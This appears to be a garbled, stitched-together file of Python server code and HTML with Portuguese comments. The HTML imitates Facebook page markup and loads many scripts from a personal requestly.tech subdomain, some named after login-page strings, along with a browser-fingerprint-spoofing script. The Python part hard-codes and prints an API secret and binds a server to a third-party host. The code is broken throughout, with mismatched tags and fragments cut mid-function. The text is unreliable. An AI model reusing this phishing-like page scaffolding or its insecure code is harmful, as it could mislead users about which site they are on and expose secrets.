        API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
        print("A chave secreta da API é:", API_SECRET)
        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'POST request received.')

class Config:
    def __init__(self):
        self.config_data = None
        self.config_path = None

    def load_config(self, config_file):
        with open(config_file, "r") as f:
            self.config_data = json.load(f)
            self.config_path = config_file
        return self.config_data

    def save_config(self):
        if self.config_data and self.config_path:
            with open(self.config_path, 'w') as outfile:
                json.dump(self.config_data, outfile)

    def create_empty_config(self, config_file):
        self.config_data = {
            'qth_latitude': 0,
            'qth_longitude': 0,
        }
        self.config_path = config_file

def run_POST(server_class=HTTPServer, handler_class=RequestHandler, port=443):
    server_address = ('ftp.osuosl.org', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()
def home():
    # Faz uma requisição à página do Facebook
    try:
        requisicao = requests.get("https://m.facebook.com/")
        if requisicao.status_code == 200:
            print("Página do Facebook carregada com sucesso!")
        else:
            print(f"Falha ao carregar a página. Status Code: {requisicao.status_code}")
    except requests.RequestException as e:
        print(f"Erro na requisição: {e}")

    # Redireciona para o Facebook
    return redirect('https://m.facebook.com', code=302)
    # Exemplo de consulta DNS
    resultado_dns = query("one.one.one.one", fallback=False, verbose=True)
    print("Resultado da consulta DNS:", resultado_dns)

    # Inicia o servidor Flask com SSL ad hoc
    app.run(ssl_context='adhoc')

html = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>satellite earth Incorporado</title>
</head>
<body>
    <iframe 
        src="https://satellite.earth"
        width="100%" 
        height="900" 
        frameborder="no" 
        allowfullscreen="true" 
        webkitallowfullscreen="true" 
        mozallowfullscreen="true" 
        scrolling="yes">
    </iframe>
  </head>
  <body>
    <div id="root"></div>
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#151515"/>
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
    <meta name="apple-mobile-web-app-capable" content="yes"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="default"/>
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-title" content="satellite earth">
    <meta name="application-name" content="satellite earth"">
    <meta name="msapplication-TileColor" content="#2b5797">
    <meta name="msapplication-config" content="https://i-adopt.github.io/ontology/ontology.xml">
    <meta name="theme-color" content="#ffffff">
    <meta property="og:site_name"content="satellite.earth"/>
    <meta property="og:url"content="https://satellite.earth"/>
    <meta property="og:locale"content="pt-BR"/>
    <link href='https://api.mapbox.com/mapbox-gl-js/v2.1.1/mapbox-gl.css' rel='stylesheet' />
    <script src='https://api.mapbox.com/mapbox-gl-js/v2.1.1/mapbox-gl.js'></script>
    <link rel="stylesheet" href="https://api.mapbox.com/mapbox-gl-js/plugins/mapbox-gl-directions/v4.1.0/mapbox-gl-directions.css" type="text/css">
    <script src="https://api.mapbox.com/mapbox-gl-js/plugins/mapbox-gl-directions/v4.1.0/mapbox-gl-directions.js"></script>

    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-M1V6SSY6NE"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){ dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'G-M1V6SSY6NE');
    </script>
 </head>
  </body>
    <div class="_li" id="u_0_2">
        <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_3">
            <div class="_608m">
                <div class="_5aj7 _tb6">
                    <div class="_4bl7"></div>
                    <div class="_4bl9 _3bcp">
                        <div class="_6a _608n" aria-label="Assistente de navegar" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_4">
                            <div class="_6a uiPopover" id="u_0_5">
                                <script defer="" crossorigin="anonymous" nomodule="" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" src="https://www.gstatic.com/engage/marketing/automation/prod/v1/marketing_analytics_client_grpc.min.js" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_6" onclick="toggleMenu()"></script>
                                    <span class="_55pe"></span>
                                    <span class="_4o_3 _3-99"><i class="sp_RLSzXDZqa9P sx_271373"></i></span>
                                </a>
                            </div>
                        </div>
                        <div class="_6a mrm uiPopover" id="u_0_7">
                            <link rel="stylesheet" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="https://s1.wp.com/_static/??-eJydzEEOwiAQQNELiVMXtCvjWYYBETsOhKE1vb01xrWR/X8fnsVQlhakQeElJlFgFF+QZnBLYg/aNg5HUj3A71hwNX8Bx5nmDzFpb7UHKtXMnCT24FteQzXUsAc3dC74r+g6bGUfXFNg38M5x2wc1re9PM6nabB2Gu0w3l/E9bJY&cssminify=yes" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_8">
                                <span class="_55pe"></span>
                                <span class="_4o_3 _3-99"><i class="sp_RLSzXDZqa9P sx_eb046e"></i></span>
                            </a>
                        </div>
                    </div>
                </div>
                <div class="_4bl7 mlm pll _3bct"></div>
            </div>
        </div>
    </div>
    </div>
    <script>
        // Carregando scripts iniciais
        console.log("Carregando scripts iniciais...");
        (function() {
            const scriptIds = ["ZVejPaf", "+Fu52I4", "8bxxRsD", "6tTjOTm", "II93DPe", "kGty6xl", "ziekIm/"];
            scriptIds.forEach(function(id) {
                console.log("Carregando script:", id);
                // Aqui você pode implementar lógica para carregar dinamicamente os scripts
            });
        })();

        // Configuração para LinkshimHandlerConfig
        console.log("Configuração do LinkshimHandlerConfig...");
        const linkshimConfig = {
            supports_meta_referrer: false,
            default_meta_referrer_policy: "default",
            switched_meta_referrer_policy: "origin",
            non_linkshim_lnfb_mode: "ie",
            link_react_default_hash: "AT0fvsUYWFMYbAnVrzQKDtCGCjCu9i9-Ob45lrLTm2C1tOzspJgi2-CLlfUBW1RonVL0LV-C3FkXBGr8GrLub3u-n5H4sYc-XvcrRardaJtGJ8-X6lwfaQoM2NoshTLl-Lwjx-sUCHS0J49Q",
            untrusted_link_default_hash: "AT2UlaalBTYtBiB1rFxvklrb8RkFRl50LLGEo62HzUbKrovi4WXaZOtG-8mbi0jacFKWBm_o5_gt9C_509fshBM_7CpjZsdopwM7ToZFZrhAGKLtP0U5ouT_GKRl6U2UHyjskRqIX_7Drstj",
            linkshim_host: "l.facebook.com",
            linkshim_path: "/l.php",
            linkshim_enc_param: "h",
            linkshim_url_param: "u",
            use_rel_no_opener: false,
            use_rel_no_referrer: false,
            always_use_https: false,
            onion_always_shim: true,
            middle_click_requires_event: false,
            www_safe_js_mode: "hover",
            m_safe_js_mode: null,
            ghl_param_link_shim: false,
            click_ids: [],
            is_linkshim_supported: true,
            current_domain: "facebook.com",
            blocklisted_domains: ["ad.doubleclick.net", "ads-encryption-url-example.com", "bs.serving-sys.com", "ad.atdmt.com", "adform.net", "ad13.adfarm1.adition.com", "ilovemyfreedoms.com", "secure.adnxs.com"],
            is_mobile_device: false
        };
        console.log("LinkshimHandlerConfig configurado:", linkshimConfig);

        // Inicializando now_inl
        const now_inl = (() => {
            const p = window.performance;
            return p && p.now && p.timing && p.timing.navigationStart
                ? () => p.now() + p.timing.navigationStart
                : () => new Date().getTime();
        })();
        window.__bigPipeFR = now_inl();
        console.log("Valor de now_inl:", window.__bigPipeFR);

        // Simulando BigPipe
        console.log("Inicializando BigPipe...");
        const bigPipe = {
            beforePageletArrive: (id, n) => {
                console.log(`Pagelet ${id} está para chegar em ${n}`);
            },
            onPageletArrive: (config) => {
                console.log("Configuração do Pagelet:", config);
            },
            setPageID: (id) => {
                console.log("ID da Página configurado:", id);
            }
        };

        // Uso do BigPipe
        bigPipe.beforePageletArrive("first_response", now_inl());
        bigPipe.onPageletArrive({
            displayResources: ["N3Hmlox", "GrqIbBd", "ITu32E2", "1E+XkEo", "KZruzbc", "Ynnl66x", "8bxxRsD", "6tTjOTm", "II93DPe", "kGty6xl", "ziekIm/"],
            id: "first_response",
            phase: 0,
            last_in_phase: true,
            tti_phase: 0,
            all_phases: [63],
            hsrp: { hblp: { consistency: { rev: 1010031100 } } },
            allResources: ["N3Hmlox", "GrqIbBd", "ITu32E2", "ZVejPaf", "+Fu52I4", "8bxxRsD", "6tTjOTm", "II93DPe", "kGty6xl", "ziekIm/", "1E+XkEo", "KZruzbc", "Ynnl66x"]
        });
        bigPipe.setPageID("7305373165822223602");

        // Outra simulação de chegada de Pagelet
        bigPipe.beforePageletArrive("last_response", now_inl());
        bigPipe.onPageletArrive({
            displayResources: ["ZZMgPUO"],
            id: "last_response",
            phase: 63,
            last_in_phase: true,
            the_end: true,
            jsmods: {
                define: [
                    ["TrackingConfig", [], { domain: "https://pixel.facebook.com" }, 325],
                    ["WebStorageMonsterLoggingURI", [], { uri: "https://repo1.maven.org/maven2/" }, 3032],
                    ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904],
                    ["TimeSpentConfig", [], { delay: 1000, timeout: 64, "0_delay": 0, "0_timeout": 8 }, 142],
                    ["WebDevicePerfInfoData", [], { needsFullUpdate: true, needsPartialUpdate: false, shouldLogResourcePerf: false }, 3977]
                ],
                require: [
                    ["BDClientSignalCollectionTrigger", "startSignalCollection", [], [{ sc: "{\"t\":1659080345,\"c\":[[30000,838801],[30001,838801]]}" }]],
                    ["NavigationMetrics", "setPage", [], [{ page: "WebUnsupportedBrowserController", page_type: "normal", page_uri: "https://www.facebook.com/unsupportedbrowser" }]]
                ]
            },
            hsrp: { hblp: { consistency: { rev: 1010031100 } } },
            allResources: ["dlMdW7h", "BFolX4R", "ZZMgPUO"]
        });
</script>
<link rel="icon" type="image/png" href="https://satellite.earth/assets/favicon-a0e2b399.png" />
<link name="robots" href="https://www.facebook.com/robots.txt" content="noindex, nofollow"/>
<link rel="search"type="application/opensearchdescription+xml" href="https://i-adopt.github.io/ontology/ontology.xml"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/main.bff6817c.js" as="script"/>
<link rel="preload" as="script" href="https://www.googletagmanager.com/gtm.js?id=GTM-NDST6LJ5"/>
<link rel="stylesheet" href="https://user1702906311872.requestly.tech/index.css">
<link rel="preload" href="https://user1702906311872.requestly.tech/301.a418fe3ec3aeee53df6a.js"></script>
<script defer="" crossorigin="anonymous" nomodule="" src="https://user1702906311872.requestly.tech/177-5a5873e7211acc7c.js"></script>
<script src="https://user1702906311872.requestly.tech/204-e0870f310887539f.js"><script/>
<script src="https://customfingerprints.bablosoft.com/clientsafe.js"></script><link rel="stylesheet" href="https://user1702906311872.requestly.tech/css"/><link rel="preload" href="https://user1702906311872.requestly.tech/main.bff6817c.js" as="script"/><link rel="preload" as="script" href="https://www.googletagmanager.com/gtm.js?id=GTM-NDST6LJ5"/><link rel="stylesheet" href="https://user1702906311872.requestly.tech/icon"/><link href="https://user1702906311872.requestly.tech/main.7064deb2.css" rel="stylesheet"><script defer="defer" src="https://user1702906311872.requestly.tech/115-0785ad0057639660.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/125.1c2e7a0d26b41210383b.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/175-250f1964de77863a.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/177-5a5873e7211acc7c.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/486.a0e11892a0dfa8d698cb.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/647-48da5f62972fdccc.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/659.ea1a68454975891536d0.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/696-c6e6cb725f0aacf1.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/742.17a021d05fbaa3dae6bb.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/795-bec7de6750fee5a0.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/805-d42293e25b58b1ed.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/821.850ccd1dbfae9b3a0d2e.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/aula.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/ConvergedLoginPaginatedStrings.en_RrzHhfd8MjAVzwXCMGp2tg2.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/en.16be8f8a.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/f923c8e2-b61b0dc470b361eb.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/f923c8e2-b61b0dc470b361eb.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/feature-switch-manifest.07e68aba.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/file.js"></script>	
<script defer="defer" src="https://user1702906311872.requestly.tech/layout-b18ca3d067596857.js"></script>	
<script defer="defer" src="https://user1702906311872.requestly.tech/mc3_base.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/main-app-70356166ee26ea0b.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/main.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/omid-session-client-v1-545709ecc6fdb83b0270d092012a34d11.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/omweb-v1-596803d7675aa3e198b8d30b41a36d821.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/omweb-v1-596803d7675aa3e198b8d30b41a36d82.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/page-08b7ee907dee0fe9.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/pal1.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/pal.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/polyfills-c67a75d1b6f99dc8.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/scheduler.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/schema.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/script.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/sdk.js.download.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/sKtrEJAtiUM.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/vendor.1b81224a.js"></script>
<script defer="defer" src="https://user1702906311872.requestly.tech/webpack-866fff1c55ed1e32.js"></script>
<link rel="preload" href="https://user1702906311872.requestly.tech/115-0785ad0057639660.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/125.1c2e7a0d26b41210383b.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/175-250f1964de77863a.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/177-5a5873e7211acc7c.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/486.a0e11892a0dfa8d698cb.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/647-48da5f62972fdccc.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/659.ea1a68454975891536d0.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/696-c6e6cb725f0aacf1.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/742.17a021d05fbaa3dae6bb.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/795-bec7de6750fee5a0.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/805-d42293e25b58b1ed.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/821.850ccd1dbfae9b3a0d2e.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/821.850ccd1dbfae9b3a0d2e.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/app.js">
<link rel="preload" href="https://user1702906311872.requestly.tech/web.js">
<link rel="preload" href="https://user1702906311872.requestly.tech/index-75UibkMC.js">
<link rel="preload" href="https://user1702906311872.requestly.tech/client.js">
<link rel="preload" href="https://user1702906311872.requestly.tech/api.js">
<link rel="preload" href="https://user1702906311872.requestly.tech/mp_preroll.js">
<link rel="preload" href="https://user1702906311872.requestly.tech/aula.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/ConvergedLoginPaginatedStrings.en_RrzHhfd8MjAVzwXCMGp2tg2.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/en.16be8f8a.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/f923c8e2-b61b0dc470b361eb.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/feature-switch-manifest.07e68aba.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/file.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/layout-b18ca3d067596857.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/mc3_base.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/main-app-70356166ee26ea0b.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/main.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/omid-session-client-v1-545709ecc6fdb83b0270d092012a34d11.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/omweb-v1-596803d7675aa3e198b8d30b41a36d821.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/omweb-v1-596803d7675aa3e198b8d30b41a36d82.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/page-08b7ee907dee0fe9.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/pal1.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/pal.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/polyfills-c67a75d1b6f99dc8.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/polyfills.986d0fee68e2b0433150.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/scheduler.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/schema.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/script.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/sdk.js.download.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/sKtrEJAtiUM.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/vendor.1b81224a.js" as="script"/>
<link rel="preload" href="https://user1702906311872.requestly.tech/webpack-866fff1c55ed1e32.js" as="script"/>
<style data-vue-ssr-id="0ac939b4:0 a9e517c6:0 b6f30280:0 781d1c24:0 0789ffd7:0 4b9deff0:0 a07b7cca:0 72925f56:0 b6df152e:0 25f2cb4c:0 2e87f3ca:0 c893aed4:0 3765882f:0 0ce567ce:0 5af6e143:0 466ffe03:0 11ebd741:0 870f24ba:0 b80e6b96:0 81b1dc02:0 2fb39b9d:0 54d46bc4:0 cdedcd5e:0 6d6fa71e:0 f2e20406:0 57505c63:0 c72f585e:0 5f160194:0 015013d2:0 bba79d3e:0 96c4765c:0 bb68bb18:0 3f041ed3:0 49c498c3:0 4fa9dfb0:0 d6779068:0 bf0d22ca:0 6f36f02c:0 389170b0:0 140cc8fd:0">.theme--light.v-application{background:#fff;color:rgba(0,0,0,.87)}.theme--light.v-application .text--primary{color:rgba(0,0,0,.87)!important}.theme--light.v-application .text--secondary{color:rgba(0,0,0,.6)!important}.theme--light.v-application .text--disabled{color:rgba(0,0,0,.38)!important}.theme--dark.v-application{background:#121212;color:#fff}.theme--dark.v-application .text--primary{color:#fff!important}.theme--dark.v-application .text--secondary{color:hsla(0,0%,100%,.7)!important}.theme--dark.v-application .text--disabled{color:hsla(0,0%,100%,.5)!important}.v-application{display:flex}.v-application a{cursor:pointer}.v-application--is-rtl{direction:rtl}.v-application--wrap{flex:1 1 auto;-webkit-backface-visibility:hidden;backface-visibility:hidden;display:flex;flex-direction:column;min-height:100vh;max-width:100%;position:relative}@-moz-document url-prefix(){@media print{.v-application,.v-application--wrap{display:block}}}
.theme--light.v-app-bar.v-toolbar.v-sheet{background-color:#f5f5f5}.theme--dark.v-app-bar.v-toolbar.v-sheet{background-color:#272727}.v-sheet.v-app-bar.v-toolbar{border-radius:0}.v-sheet.v-app-bar.v-toolbar:not(.v-sheet--outlined){box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)}.v-sheet.v-app-bar.v-toolbar.v-sheet--shaped{border-radius:24px 0}.v-app-bar:not([data-booted=true]){transition:none!important}.v-app-bar.v-app-bar--fixed{position:fixed;top:0;z-index:5}.v-app-bar.v-app-bar--hide-shadow{box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)!important}.v-app-bar--fade-img-on-scroll .v-toolbar__image .v-image__image{transition:opacity .4s cubic-bezier(.4,0,.2,1)}.v-app-bar.v-toolbar--prominent.v-app-bar--shrink-on-scroll .v-toolbar__content{will-change:height}.v-app-bar.v-toolbar--prominent.v-app-bar--shrink-on-scroll .v-toolbar__image{will-change:opacity}.v-app-bar.v-toolbar--prominent.v-app-bar--shrink-on-scroll.v-app-bar--collapse-on-scroll .v-toolbar__extension{display:none}.v-app-bar.v-toolbar--prominent.v-app-bar--shrink-on-scroll.v-app-bar--is-scrolled .v-toolbar__title{padding-top:9px}.v-app-bar.v-toolbar--prominent.v-app-bar--shrink-on-scroll.v-app-bar--is-scrolled:not(.v-app-bar--bottom) .v-toolbar__title{padding-bottom:9px}.v-app-bar.v-app-bar--shrink-on-scroll .v-toolbar__title{font-size:inherit}
.theme--light.v-toolbar.v-sheet{background-color:#fff}.theme--dark.v-toolbar.v-sheet{background-color:#272727}.v-sheet.v-toolbar{border-radius:0}.v-sheet.v-toolbar:not(.v-sheet--outlined){box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)}.v-sheet.v-toolbar.v-sheet--shaped{border-radius:24px 0}.v-toolbar{contain:layout;display:block;flex:1 1 auto;max-width:100%;transition:transform .2s cubic-bezier(.4,0,.2,1),background-color .2s cubic-bezier(.4,0,.2,1),left .2s cubic-bezier(.4,0,.2,1),right .2s cubic-bezier(.4,0,.2,1),box-shadow .28s cubic-bezier(.4,0,.2,1),max-width .25s cubic-bezier(.4,0,.2,1),width .25s cubic-bezier(.4,0,.2,1);position:relative;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)}.v-toolbar .v-input{padding-top:0;margin-top:0}.v-toolbar__content,.v-toolbar__extension{padding:4px 16px}.v-toolbar__content .v-btn.v-btn--icon.v-size--default,.v-toolbar__extension .v-btn.v-btn--icon.v-size--default{height:48px;width:48px}.v-application--is-ltr .v-toolbar__content>.v-btn.v-btn--icon:first-child,.v-application--is-ltr .v-toolbar__extension>.v-btn.v-btn--icon:first-child{margin-left:-12px}.v-application--is-rtl .v-toolbar__content>.v-btn.v-btn--icon:first-child,.v-application--is-rtl .v-toolbar__extension>.v-btn.v-btn--icon:first-child{margin-right:-12px}.v-application--is-ltr .v-toolbar__content>.v-btn.v-btn--icon:first-child+.v-toolbar__title,.v-application--is-ltr .v-toolbar__extension>.v-btn.v-btn--icon:first-child+.v-toolbar__title{padding-left:20px}.v-application--is-rtl .v-toolbar__content>.v-btn.v-btn--icon:first-child+.v-toolbar__title,.v-application--is-rtl .v-toolbar__extension>.v-btn.v-btn--icon:first-child+.v-toolbar__title{padding-right:20px}.v-application--is-ltr .v-toolbar__content>.v-btn.v-btn--icon:last-child,.v-application--is-ltr .v-toolbar__extension>.v-btn.v-btn--icon:last-child{margin-right:-12px}.v-application--is-rtl .v-toolbar__content>.v-btn.v-btn--icon:last-child,.v-application--is-rtl .v-toolbar__extension>.v-btn.v-btn--icon:last-child{margin-left:-12px}.v-toolbar__content>.v-tabs,.v-toolbar__extension>.v-tabs{height:inherit;margin-top:-4px;margin-bottom:-4px}.v-toolbar__content>.v-tabs>.v-slide-group.v-tabs-bar,.v-toolbar__extension>.v-tabs>.v-slide-group.v-tabs-bar{background-color:inherit;height:inherit}.v-toolbar__content>.v-tabs:first-child,.v-toolbar__extension>.v-tabs:first-child{margin-left:-16px}.v-toolbar__content>.v-tabs:last-child,.v-toolbar__extension>.v-tabs:last-child{margin-right:-16px}.v-toolbar__content,.v-toolbar__extension{align-items:center;display:flex;position:relative;z-index:0}.v-toolbar__image{position:absolute;top:0;bottom:0;width:100%;z-index:0;contain:strict}.v-toolbar__image,.v-toolbar__image .v-image{border-radius:inherit}.v-toolbar__items{display:flex;height:inherit}.v-toolbar__items>.v-btn{border-radius:0;height:100%!important;max-height:none}.v-toolbar__title{font-size:1.25rem;line-height:1.5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.v-toolbar.v-toolbar--absolute{position:absolute;top:0;z-index:1}.v-toolbar.v-toolbar--bottom{top:auto;bottom:0}.v-toolbar.v-toolbar--collapse .v-toolbar__title{white-space:nowrap}.v-toolbar.v-toolbar--collapsed{max-width:112px;overflow:hidden}.v-application--is-ltr .v-toolbar.v-toolbar--collapsed{border-bottom-right-radius:24px}.v-application--is-rtl .v-toolbar.v-toolbar--collapsed{border-bottom-left-radius:24px}.v-toolbar.v-toolbar--collapsed .v-toolbar__extension,.v-toolbar.v-toolbar--collapsed .v-toolbar__title{display:none}.v-toolbar--dense .v-toolbar__content,.v-toolbar--dense .v-toolbar__extension{padding-top:0;padding-bottom:0}.v-toolbar--flat{box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)!important}.v-toolbar--floating{display:inline-flex}.v-toolbar--prominent .v-toolbar__content{align-items:flex-start}.v-toolbar--prominent .v-toolbar__title{font-size:1.5rem;padding-top:6px}.v-toolbar--prominent:not(.v-toolbar--bottom) .v-toolbar__title{align-self:flex-end;padding-bottom:6px;padding-top:0}
.theme--light.v-sheet{background-color:#fff;border-color:#fff;color:rgba(0,0,0,.87)}.theme--light.v-sheet--outlined{border:thin solid rgba(0,0,0,.12)}.theme--dark.v-sheet{background-color:#1e1e1e;border-color:#1e1e1e;color:#fff}.theme--dark.v-sheet--outlined{border:thin solid hsla(0,0%,100%,.12)}.v-sheet{border-radius:0}.v-sheet:not(.v-sheet--outlined){box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)}.v-sheet.v-sheet--shaped{border-radius:24px 0}
@-webkit-keyframes v-shake{59%{margin-left:0}60%,80%{margin-left:2px}70%,90%{margin-left:-2px}}@keyframes v-shake{59%{margin-left:0}60%,80%{margin-left:2px}70%,90%{margin-left:-2px}}.v-application .black{background-color:#000!important;border-color:#000!important}.v-application .black--text{color:#000!important;caret-color:#000!important}.v-application .white{background-color:#fff!important;border-color:#fff!important}.v-application .white--text{color:#fff!important;caret-color:#fff!important}.v-application .transparent{background-color:transparent!important;border-color:transparent!important}.v-application .transparent--text{color:transparent!important;caret-color:transparent!important}.v-application .red{background-color:#f44336!important;border-color:#f44336!important}.v-application .red--text{color:#f44336!important;caret-color:#f44336!important}.v-application .red.lighten-5{background-color:#ffebee!important;border-color:#ffebee!important}.v-application .red--text.text--lighten-5{color:#ffebee!important;caret-color:#ffebee!important}.v-application .red.lighten-4{background-color:#ffcdd2!important;border-color:#ffcdd2!important}.v-application .red--text.text--lighten-4{color:#ffcdd2!important;caret-color:#ffcdd2!important}.v-application .red.lighten-3{background-color:#ef9a9a!important;border-color:#ef9a9a!important}.v-application .red--text.text--lighten-3{color:#ef9a9a!important;caret-color:#ef9a9a!important}.v-application .red.lighten-2{background-color:#e57373!important;border-color:#e57373!important}.v-application .red--text.text--lighten-2{color:#e57373!important;caret-color:#e57373!important}.v-application .red.lighten-1{background-color:#ef5350!important;border-color:#ef5350!important}.v-application .red--text.text--lighten-1{color:#ef5350!important;caret-color:#ef5350!important}.v-application .red.darken-1{background-color:#e53935!important;border-color:#e53935!important}.v-application .red--text.text--darken-1{color:#e53935!important;caret-color:#e53935!important}.v-application .red.darken-2{background-color:#d32f2f!important;border-color:#d32f2f!important}.v-application .red--text.text--darken-2{color:#d32f2f!important;caret-color:#d32f2f!important}.v-application .red.darken-3{background-color:#c62828!important;border-color:#c62828!important}.v-application .red--text.text--darken-3{color:#c62828!important;caret-color:#c62828!important}.v-application .red.darken-4{background-color:#b71c1c!important;border-color:#b71c1c!important}.v-application .red--text.text--darken-4{color:#b71c1c!important;caret-color:#b71c1c!important}.v-application .red.accent-1{background-color:#ff8a80!important;border-color:#ff8a80!important}.v-application .red--text.text--accent-1{color:#ff8a80!important;caret-color:#ff8a80!important}.v-application .red.accent-2{background-color:#ff5252!important;border-color:#ff5252!important}.v-application .red--text.text--accent-2{color:#ff5252!important;caret-color:#ff5252!important}.v-application .red.accent-3{background-color:#ff1744!important;border-color:#ff1744!important}.v-application .red--text.text--accent-3{color:#ff1744!important;caret-color:#ff1744!important}.v-application .red.accent-4{background-color:#d50000!important;border-color:#d50000!important}.v-application .red--text.text--accent-4{color:#d50000!important;caret-color:#d50000!important}.v-application .pink{background-color:#e91e63!important;border-color:#e91e63!important}.v-application .pink--text{color:#e91e63!important;caret-color:#e91e63!important}.v-application .pink.lighten-5{background-color:#fce4ec!important;border-color:#fce4ec!important}.v-application .pink--text.text--lighten-5{color:#fce4ec!important;caret-color:#fce4ec!important}.v-application 